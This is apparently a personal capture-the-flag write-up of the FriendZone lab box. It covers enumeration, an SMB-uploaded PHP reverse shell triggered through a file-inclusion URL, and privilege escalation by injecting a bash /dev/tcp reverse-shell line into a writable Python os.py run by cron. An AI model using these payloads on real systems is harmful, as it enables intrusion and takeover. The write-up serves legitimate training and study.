# What I learned in this box?
1. smb可以尝试上传reverse shell， 然后通过web触发哦，`不要将不同的服务割裂开看`
2. crontab 的配置文件还有可能在这个位置: `/var/spool/cron/crontabs`
3. 当python无法使用os的时候，可以通过写文件来rce，比如crontab 文件。因为open是buildin方法，不受外部库的限制。
## Information gathering
Target IP address: 10.10.10.123
### Nmap Scan Result

``` bash
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_http-server-header: Apache/2.4.29 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: 404 Not Found
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```

### Service Enumerate
Port | Service | Version
-----|---------|--------
21 | ftp | vsftpd 3.0.3
22 | ssh | 7.6
53 | dns | 9.11.3
80 | http | apache httpd 2.4.29
139| netbios-smb | 3.x-4.x
443| https | apache httpd 2.4.29
445| netbios-smb | 4.7.6

#### DNS Enum
##### Zone transfer
```bash
 dig axfr @10.10.10.123 friendzone.red

<<>> DiG 9.18.4-2-Debian <<>> axfr @10.10.10.123 friendzone.red
; (1 server found)
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 151 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Tue Jan 03 17:41:02 CST 2023
;; XFR size: 8 records (messages 1, bytes 289)
```

#### SMB Service

_List shared folder:_

```bash
smbclient --no-pass -L //10.10.10.123
```

find there are several shared folders.

```bash
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
Files           Disk      FriendZone Samba Server Files /etc/Files
general         Disk      FriendZone Samba Server Files
Development     Disk      FriendZone Samba Server Files
IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

Server               Comment
---------            -------

Workgroup            Master
---------            -------
WORKGROUP            FRIENDZONE
```

_connect general folder:_

find a creds.txt file within a credential for admin user.

```bash
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

#### Web enumerate

find several url and domain name:
![[Pasted image 20230103193213.png]]

### Password Crack
#### john

#### hydra


## Exploit

### Initial Foothold

_Login:_ 
https://administrator1.friendzone.red is an admin login panel. Login with the credential found in smb enumerate stage.

_upload:_
upload a php reverse shell through https://uploads.friendzone.red
not work
upload the reverse shell through smb to development folder
![[Pasted image 20230103193008.png]]

_access the php script uploaded_:

goto this url: https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell.php, and the reverse shell would be trigged.

#### Exploit method

upload reverse shell and trigged it.

#### Vulnerability Explanation

#### Exp code or link

[the php reverse shell code](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

#### Proof screen shot

![[Pasted image 20230103193524.png]]

### Lateral Movement
find the `friend` user's credential in a mysql conf file. Then use it to login as friend user.

#### Exploit method
plain text credential in the configuration file:
![[Pasted image 20230103193837.png]]
#### Exp code or link

#### Proof screen shot
![[Pasted image 20230103193906.png]]

### Privilege Escalation

#### Exploit method
_find a cron job with pspy64:
![[Pasted image 20230103201802.png]]

_python package injection_
reporter.py import os package. But the os.py in /usr/lib/python2.7 is writable by friend.

_modify the reporter.py file by insert code into os.py_
add this line into os.py, So it will be execute when the os package is imported.
```python
f = open('/opt/server_admin/reporter.py', 'a')
f.write('\nos.system("/bin/bash -c \'/bin/bash -i >& /dev/tcp/10.10.14.13/6002 0>&1\'")')
```

_watch the reporter.py_
the reporter has been modified.
![[Pasted image 20230103202117.png]]

_get the reverse shell_
1. listen on 6002 port
2. get the shell when cron job run
#### Exp code or link

#### Proof screen shot
![[Pasted image 20230103202228.png]]